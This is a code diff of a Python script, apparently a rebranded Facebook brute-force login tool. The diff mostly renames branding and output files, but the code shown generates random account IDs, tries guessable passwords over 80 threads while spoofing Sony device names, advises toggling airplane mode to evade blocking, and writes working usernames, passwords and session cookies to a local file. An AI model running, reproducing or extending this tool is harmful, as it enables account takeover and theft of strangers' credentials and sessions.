@@ -81,17 +81,16 @@ class System:
    ██╔══██║   ██║   ██║   ██║██║╚██╔╝██║
    ██║  ██║   ██║   ╚██████╔╝██║ ╚═╝ ██║
    ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ \033[1;34m ᴾᴿᴼ
-\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
-        print("FEATURE    : KUXX NHI HAIN BSDK ")
-        print("VERSION    : 1.4")
+\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
+        print("Author    : SUMON ROY ")
+        print("ABOUTS    :  a script designed to attempt logins")
         print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
     
     def Main(self):
         self.banner()
-        code1 = input("ENTER SIM CODE : ")
-        code2 = input("ENTER SIM CODE : ")
-        code3 = input("ENTER SIM CODE : ")
-        limit = int(input("ENTER ID LIMIT : "))
+        code1 = input("INPUT CODE : ")
+        code2 = input("INPUT CODE : ")
+        limit = int(input("INPUT TOTAL LIMIT : "))
         print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n[1] METHOD 1\n[2] METHOD 2\n[3] METHOD 3")
         method_select = input("SELECT METHOD : ")
         for a in range(limit):
@@ -99,10 +98,10 @@ class System:
             self.gen.append(xxx)
         with tred(max_workers=80) as randx:
             self.banner()
-            print("IF NO RESULT USE FLIGHT MODE")
+            print(' USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE ON/OFF ')
             print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
             for love in self.gen:
-                ids = random.choice([code1,code2,code3])+love
+                ids = random.choice([code1,code2])+love
                 passlist = [ids[:6],ids,ids[:7],love[:6] ,"57273200"]
                 if method_select == "1":randx.submit(self.method1,ids,passlist)
                 elif method_select == "2":randx.submit(self.method2,ids,passlist)
@@ -128,7 +127,7 @@ class System:
         global loop,oks,cps
         ses = requests.Session()
         google_pixel = ["BRAVIA 2015","BRAVIA 2K GB ATV3","BRAVIA 4K 2015","BRAVIA 4K GB","BRAVIA 4K GB ATV3","BRAVIA 4K UR2","BRAVIA 4K UR3","BRAVIA 4K VH2","BRAVIA VH1","BRAVIA VU1","Sony Experia 10","H4433","SONY-M880","SGP412","SGP551","SmartWatch 3","Sony Tablet P","Sony Tablet P","Sony Tablet P","Sony Tablet P","Sony Tablet S","Sony Tablet S","Sony Tablet S","Sony Tablet S","Sony Tablet S","NW-A100Series","NW-Z1000Series","Sony Xperia","J9110","802SO","SOV40","SO-51A","SOG01","XQ-AT51","XQ-AT42","SO51Aa","SO-51B","XQ-BC52","SOG03","XQ-BC72","XQ-CT72","XQ-CT54","SOG06","I4113","I3113","I4193","SO-41A","SOV43","A001SO","XQ-AU52","XQ-AT52","XQ-BT52","SOG04","A102SO","SO-52B","XQ-BT44","XQ-CC54","XQ-CC72","SO-52C","A202SO","I4293","I4213","SOV41","901SO","SO-01M","J8210","J9210","SO-52A","SOG02","XQ-AS52","A002SO","XQ-AS72","XQ-BQ52","SO-53B","SOG05","XQ-BQ72","A103SO","XQ-CQ54","XQ-CQ72","SOV42","902SO","J3273","SO-04E","SonySO-04E","Xperia A","SO-04F","SAMSUNG Xperia a369i","SO-04G","SO-04G","J3173","SO-41B","SOG08","SO-53C","A203SO","Xperia Active","Xperia Active","Xperia Active","Xperia Arc","Xperia Arc","Xperia Arc","Xperia Arc S","Xperia Arc S","Xperia Arc S","Xperia Arc S","Xperia Arc S","Xperia Arc S","Xperia Arc S","Xperia Arc S","Xperia Arc S","Xperia Arc S","Xperia Arc S","Xperia Arc S","Xperia Arc S","SonyEricssonSO-02C","SonyEricssonSO-02C","SonyEricssonSO-02C","SonyEricssonSO-02C","SonyEricssonSO-02C","SonyEricssonSO-02C","SonyEricssonSO-02C","SonyEricssonSO-03D","SonyEricssonSO-03D","SonyEricssonSO-03D","SonyEricssonSO-03D","SonyEricssonSO-03D","SonyEricssonSO-03D","SonyEricssonSO-03D","LT26w","LT26w","SO-01E","Sony Xperia B6376","XPERIA BEAST 3","Xperia Burst","S39h","C2304","C2305","C2304","C2305","D2533","D2502","E5306","E5303","E5303","E5353","E5333","E5363","E5333","Xperia C5","E5553","E5506","E5533","E5563","XPERIA CUSTOM XA8","C1505","C1505","C1504","SonyC1504","SonyC1505v","SonyC1505","SonyC1504","SonyC1505","SonyC1504","C1505","C1505","SonyC1505","SonyC1505","SonyC1505","C1604","SonyC1605","SonyC1604","C1605","C1605","SonyC1605","C1604","SonyC1605","D2005","D2004","SonyD2005","D2005","D2104","D2114","D2105","D2105","XPERIA E16i","D2203","D2202","D2243","D2206","Xperia E3 3G","E3 Dual","D2212","D2212","D2212","E2115","E2104","E2105","xperia e4 dual","E2003","E2053","E2006","E2043","E2033","E2033","F3311","F3313","Xperia F_v3 Ultra","SONY XPERIA G","SonyST27a","SonyST27i","ST27a","ST27i","ST27I","ru ST27i","SonyST27i","SonyEricssonST27i","ST27i","ST27i","SO-04D","SonySO-04D","Xperia H870","SonyLT28i","SonyLT28h","LT28h","SonyEricssonLT28at","SonyEricssonLT28h","LT28i","LT28h","SonyLT28h","Xperia ion","Xperia ion","SonyEricssonLT28i","SonyEricssonLT28i","SonyEricssonLT28h","SonyEricssonLT28i","SonyST26a","ST26a","SonyST26i-o","SonyST26i","ST26i","ST26i","Xperia J","SonyST26i","SonyST26i","SonyST26i","SonyST26i","SonyST26i","ST26i","C2105","C2105","C2105","C2105","C2105","G3311","G3311","G3313","G3312","ru G3312","H3311","H3321","H4311","I3312","I4312","XQ-AD52","C1905","C1904","C1905","SonyC1904","SonyC1905","C1905","C1905","C2004","C2005","D2303","D2306","D2303","Xperia M2 3G","D2406","D2403","D2302","XPERIA M2 HSPASS","E2303","E2333","E2306","E2363","E2312","E2312","E5603","E5606","E5653","E5633","E5663","Xperia Mini","Xperia Mini","Xperia Mini","Xperia Mini","Xperia Mini","Xperia Mini Pro","Xperia Mini Pro","Xperia Mini Pro","Xperia Mini Pro","Xperia Mini Pro","Xperia mini pro","ST23i","SonyST23iv","SonyST23a","ST23i","SonyST23i","ST23i","ST23i","ST23i","SonyST23i","SonyST23i","SonyST23i","Xperia Neo","Xperia Neo","Xperia Neo","Xperia Neo","Xperia Neo","Xperia Neo L","Xperia Neo V","Xperia Neo V","Sony Xperia Neo V","Xperia Neo V","Xperia Neo V","Xperia Neo V","Xperia Neo V","Xperia Neo V","Xperia Neo V","Xperia Neo V","SO-02D","Xperia P","SonyLT22i","LT22i","SonyEricssonLT22i","SonyEricssonLT22i-o","LT22i","LT22i","LT22i","SonyEricssonLT22i-o","SonyLT22i","XQ-AQ52","XQ-AQ62","XQ-BE52","XQ-BE62","XQ-BE72","G2299","Xperia Ray","Xperia Ray","Xperia Ray","Xperia Ray","Xperia Ray","Xperia Ray","Xperia Ray","Xperia Ray","Xperia Ray","Xperia Ray","Sony Xperia RC","Sony Xperia RC","SonyLT26iv","LT26i","SonyEricssonLT26i-o","SonyEricssonLT26i","LT26i","Xperia S","LT26i","SonyEricssonLT26i","Xperia S","Xperia S","Xperia S","SonyLT26i","LT26ii","ru LT26ii","LT26ii","LT26ii","Xperia Sola","Xperia Sola","C5303","C5302","C5306","SonyC5303","SonyC5306","C5303","Xperia SP","SO-05D","LT30p","SonyLT30p-o","LT30p","SonyLT30p","LT30p","LT30a","SonyLT30a","D5303","D5306","D5316","XM50h","XM50t","D5303","D5322","Xperia T3","D5103","D5102","D5106","D5103","Xperia Tab","SGPT12","Xperia Tablet S","SGPT13","SGPT13","SGPT12","SGP311","SGP321","SGP312","SGP512","SGP511","SGP521","SGP621","SGP611","SGP712","SonyST21i","SonyST21i","SonyST21i-o","ST21i","ST21a","ST21i","SonyST21a","SonyST21i","SonyST21i","SonyST21i","SonyST21i","SonyST21i","SonyST21i","SonyST21a","SonyST21i","SonyST21a","ST21i2","SonyST21a2","SonyST21i2","SonyST21i2","SonyST21i2","ru ST21i2","SonyST21i2","ST21i2","LT29i","Xperia TX","SonyST25i","ST25a","ST25i","ST25a","SonyEricssonST25i","ST25i","ru ST25i","ST25i","SonyEricssonST25i","SonyEricssonST25i","SonyEricssonST25i","SOL22","SOL22","SonySOL22","Xperia UL","Xperia V","SonyLT25i","Sony Xperia V","SonyLT25i","SonySOL21","F5121","F5321","SO-02J","F5122","502SO","F8131","SO-04H","SOV33","F8132","Xperia X10","Xperia X10","Xperia X10","Xperia X10","Xperia x10 Mini Pro","Xperia X42","Xperia X8","XPERIA X8","Xperia X8","XPERIA X8","XPERIA X8","Xperia X8","Xperia X8","Xperia X8","XPERIA X8","F3111","F3115","Xperia XA 4"]
-        sys.stdout.write(f"\r\r\x1b[m {self.loop}|RND•1|OK:-{len(self.oks)}|CP:-{len(self.cps)}\r\r"),
+        sys.stdout.write(f"\r\r\033[1;32m M-1|{self.loop}|OK:-{len(self.oks)}|CP:-{len(self.cps)}\r\r"),
         sys.stdout.flush()
         try:
             for pas in passlist:
@@ -168,8 +167,8 @@ class System:
                     user = re.findall('c_user=(.*);xs', kuki)[0]
                     req = requests.get(f"https://graph.facebook.com/{user}/picture?type=normal").text
                     if "Photoshop" in req:
-                        print(f"\r\r\x1b[38;5;46mDEV-OK • {user} • {pas} • {kuki}")
-                        open("/sdcard/dev-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        print(f"\r\r\x1b[38;5;46mATOM-OK • {user} • {pas} • {kuki}")
+                        open("/sdcard/ATOM-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                         self.oks.append(user)
                         break
                 elif "checkpoint" in log_cookies:
@@ -184,7 +183,7 @@ class System:
     def method2(self,ids,passlist):
         global loop,oks,cps
         ses = requests.Session()
-        sys.stdout.write(f"\r\r\x1b[m {self.loop}|RND•2|OK:-{len(self.oks)}|CP:-{len(self.cps)}\r\r"),
+        sys.stdout.write(f"\r\r\033[1;32m M-2|{self.loop}|OK:-{len(self.oks)}|CP:-{len(self.cps)}\r\r"),
         sys.stdout.flush()
         try:
             for pas in passlist:
@@ -225,8 +224,8 @@ class System:
                     user = re.findall('c_user=(.*);xs', kuki)[0]
                     req = requests.get(f"https://graph.facebook.com/{user}/picture?type=normal").text
                     if "Photoshop" in req:
-                        print(f"\r\r\x1b[38;5;46mDEV-OK • {user} • {pas} • {kuki}")
-                        open("/sdcard/dev-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        print(f"\r\r\x1b[38;5;46mATOM-OK • {user} • {pas} • {kuki}")
+                        open("/sdcard/ATOM-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                         self.oks.append(user)
                         break
                 elif "checkpoint" in log_cookies:
@@ -241,7 +240,7 @@ class System:
     def method3(self,ids,passlist):
         global loop,oks,cps
         ses = requests.Session()
-        sys.stdout.write(f"\r\r\x1b[m {self.loop}|RND•3|OK:-{len(self.oks)}|CP:-{len(self.cps)}\r\r"),
+        sys.stdout.write(f"\r\r\033[1;32m M-3|{self.loop}|OK:-{len(self.oks)}|CP:-{len(self.cps)}\r\r"),
         sys.stdout.flush()
         try:
             for pas in passlist:
@@ -364,8 +363,8 @@ class System:
                     user = re.findall('c_user=(.*);xs', kuki)[0]
                     req = requests.get(f"https://graph.facebook.com/{user}/picture?type=normal").text
                     if "Photoshop" in req:
-                        print(f"\r\r\x1b[38;5;46mDEV-OK • {user} • {pas} • {kuki}")
-                        open("/sdcard/dev-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        print(f"\r\r\x1b[38;5;46mATOM-OK • {user} • {pas} • {kuki}")
+                        open("/sdcard/ATOM-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                         self.oks.append(user)
                         break
                 elif "www.facebook.com" in response["error"]["message"]:
